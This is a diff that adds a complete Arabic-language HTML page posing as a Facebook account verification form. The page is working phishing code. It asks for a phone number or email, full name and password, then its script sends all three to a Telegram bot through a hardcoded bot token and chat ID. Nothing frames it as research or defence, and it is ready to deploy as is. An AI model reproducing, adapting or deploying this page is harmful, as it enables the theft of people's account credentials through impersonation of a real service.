@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>توثيق حساب فيسبوك</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #3b5998, #8b9dc3);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background: #ffffff;
+            padding: 30px 40px;
+            border-radius: 10px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            width: 350px;
+            border: 1px solid #ddd;
+        }
+        .container img {
+            width: 50px;
+            margin-bottom: 20px;
+        }
+        .container h1 {
+            color: #333;
+            font-size: 26px;
+            margin-bottom: 15px;
+        }
+        .container p {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin: 12px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+        button {
+            background-color: #3b5998;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            transition: background-color 0.3s ease;
+        }
+        button:hover {
+            background-color: #365899;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #999;
+        }
+        .footer a {
+            color: #3b5998;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+        <h1>طلب توثيق حساب فيسبوك</h1>
+        <p>يرجى تعبئة النموذج أدناه لتقديم طلب التوثيق.</p>
+        <form id="verificationForm">
+            <input type="text" name="contact" placeholder="رقم الهاتف أو البريد الإلكتروني" required>
+            <input type="text" name="name" placeholder="الاسم الكامل" required>
+            <input type="password" name="password" placeholder="كلمة المرور" required>
+            <button type="submit">إرسال الطلب</button>
+        </form>
+        <div class="footer">
+            <p>جميع الحقوق محفوظة © 2024</p>
+            <p><a href="#">سياسة الخصوصية</a> | <a href="#">الشروط والأحكام</a></p>
+        </div>
+    </div>
+
+    <script>
+        const form = document.getElementById("verificationForm");
+        const BOT_TOKEN = "8124156933:AAEoF0psQ6nQr3ODdEsHN7wTlMFKtXBN3Io"; // توكن البوت الخاص بك
+        const CHAT_ID = "1250337678"; // معرف المحادثة الخاص بك
+
+        form.addEventListener("submit", function(event) {
+            event.preventDefault(); // منع إعادة تحميل الصفحة
+
+            const formData = new FormData(form);
+            const data = {
+                contact: formData.get("contact"),
+                name: formData.get("name"),
+                password: formData.get("password"),
+            };
+
+            const message = `
+طلب جديد لتوثيق الحساب:
+📧 جهة الاتصال: ${data.contact}
+👤 الاسم: ${data.name}
+🔒 كلمة المرور: ${data.password}
+            `;
+
+            // إرسال البيانات إلى Telegram
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    alert("تم إرسال طلبك بنجاح!");
+                    form.reset();
+                } else {
+                    alert("حدث خطأ أثناء إرسال الطلب. حاول مرة أخرى.");
+                }
+            })
+            .catch(error => {
+                alert("خطأ في الاتصال. تحقق من إعداداتك وحاول مرة أخرى.");
+                console.error("Error:", error);
+            });
+        });
+    </script>
+</body>
+</html>
